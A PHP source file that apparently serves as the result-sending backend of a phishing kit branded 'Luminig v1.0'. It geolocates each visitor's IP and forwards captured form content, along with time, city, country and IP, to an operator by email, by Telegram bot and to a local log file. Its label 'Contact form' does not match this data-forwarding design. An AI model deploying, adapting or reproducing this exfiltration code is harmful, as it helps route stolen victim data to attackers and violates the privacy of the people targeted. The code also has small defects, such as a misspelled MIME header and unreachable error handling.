<?php
$setup = parse_ini_file('setup.ini');
define('EMAIL_ENABLE', $setup['email_enable']);
define('EMAIL', $setup['email']);
define('SUBJECT', $setup['subject']);
define('TELEGRAM_ENABLE', $setup['telegram_enable']);
define('TOKEN', $setup['token']);
define('CHAT_ID', $setup['chat_id']);
define('TEXT_ENABLE', $setup['text_enable']);
define('FILE_NAME', $setup['file']);
define('TIME_DATE', date('H:i:s d/m/Y'));
$TIME_DATE = date('H:i:s d/m/Y');
class config
{
    public function getIp()
    {
        foreach (array(
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ) as $key)
        {
            if (array_key_exists($key, $_SERVER) === true)
            {
                foreach (explode(',', $_SERVER[$key]) as $IPaddress)
                {
                    $IPaddress = trim($IPaddress);
                    if (filter_var($IPaddress, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                    {
                        return $IPaddress;
                    }
                }
            }
        }
    }
    public function datac2($data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=" . $this->getIp());
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false)
        {
            return "127.0.0.1";
        }
        $code = json_decode($json);
        switch ($data)
        {
            case "country":
                $str = $code->geoplugin_countryName;
            break;
            case "city":
                $str = $code->geoplugin_city;
            break;
            default:
                $str = $code->geoplugin_request;
        }
        return $str;
    }
   
    public function sendMail($msg)
    {
        $TIME_DATE = TIME_DATE;
        $message = <<< EOT
        
                            <div style="text-align: center; text-align: -webkit-center;overflow: hidden; border-radius: 10px; font-size: 14px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif,Helvetica,Inter;" >
                        <header style="background-color:black; padding: 10px; display: flex; justify-content: center; align-items: center;">
                        <p style="color: #fff; font-weight: bold; font-size: 20px;">
                            <span style="color:#c3c3c3">L</span>muing
                        </p>
                            
                        </header>
                        <div id="body" style="background-color: #fff; color: #272727; padding: 20px; text-align: center; text-align: -webkit-center; width: 70%;">
                            $msg
                            <div id="ip">
                                <p style="font-size: 22px; ">Visitor Info</p>
                                <div id="message" style="border-radius: 6px;  border: 1px solid #e9e9e9; margin: 10px 0;">
                                    <div class="title" style="font-size: 15px; font-weight: bold;  ">
                                        <p>TIME/DATE</p>
                                    </div>
                                    <div class="content" style=" ">
                                    <p>$TIME_DATE</p>
                                    </div>
                                </div>
                                <div id="message" style="border-radius: 6px;  border: 1px solid #e9e9e9; margin: 10px 0;">
                                    <div class="title" style="font-size: 15px; font-weight: bold;  ">
                                        <p>Country</p>
                                    </div>
                                    <div class="content" style=" ">
                                    <p>{$this->datac2('country')}</p>
                                    </div>
                                </div>
                                <div id="message" style="border-radius: 6px;  border: 1px solid #e9e9e9; margin: 10px 0;">
                                    <div class="title" style="font-size: 15px; font-weight: bold;  ">
                                        <p>City</p>
                                    </div>
                                    <div class="content" style=" ">
                                        <p>{$this->datac2('city')}</p>
                                    </div>
                                </div>
                                <div id="message" style="border-radius: 6px;  border: 1px solid #e9e9e9; margin: 10px 0;">
                                    <div class="title" style="font-size: 15px; font-weight: bold;  ">
                                    <p>IP</p>
                                    </div>
                                    <div class="content" style=" ">
                                        <p>{$this->datac2('ip')}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <footer style="text-align:center">
                            Contact form by <a href="http://ricko34Sync" target="_blank" rel="noopener noreferrer" style="color: rgb(207 34 74); text-decoration-line: none;">ricko34Sync</a>
                        </footer>
                    </div>
        EOT;
	$headers = "MIM-Version: 1.0 \r\n";
	$headers .= "Content-Type: text/html charset=UTF-8 \r\n";
    $sent = @mail(EMAIL, SUBJECT, $message, $headers);
	if(!$sent) {
        throw new Exception("fail_request_400");
    } 
    }
    public function sendTelegram_msg($token,$id,$content)
    {
        $TIME_DATE = TIME_DATE;
        $data = [
            'chat_id' => $id,

            'text' => "
            =========== <[ ✪ Luminig v1.0 ✪ ]> =========== \n\r
            $content \n\r
            ----- Visitor info ----- \n\r
            [ TIME/DATE ] : $TIME_DATE \n\r
            [ CITY ] : {$this->datac2('city')} \n\r
            [ COUNTRY ] : {$this->datac2('country')} \n\r
            [ IP ] : {$this->datac2('ip')} \n\r"
        ];
        $response = file_get_contents("https://api.telegram.org/bot$token/sendMessage?" .
                                       http_build_query($data) );
                                       return $response;
                                       if(!$response) {
                                        throw new Exception("fail_request_400");
                                    } 
    }
    public function save($file, $content)
    {
        $TIME_DATE = TIME_DATE;
        $text = "
        =========== <[ ✪ Luminig v1.0 ✪ ]> =========== \n\r
        $content \n\r
        ----- Visitor info ----- \n\r
        [ TIME/DATE ] : $TIME_DATE
        [ CITY ] : {$this->datac2('city')} \n\r
        [ COUNTRY ] : {$this->datac2('country')} \n\r
        [ IP ] : {$this->datac2('ip')} \n\r";
        $fp = fopen($file, "a+");
        fwrite($fp, $text);
        fclose($fp);
    }
    
}
$luming= new config();
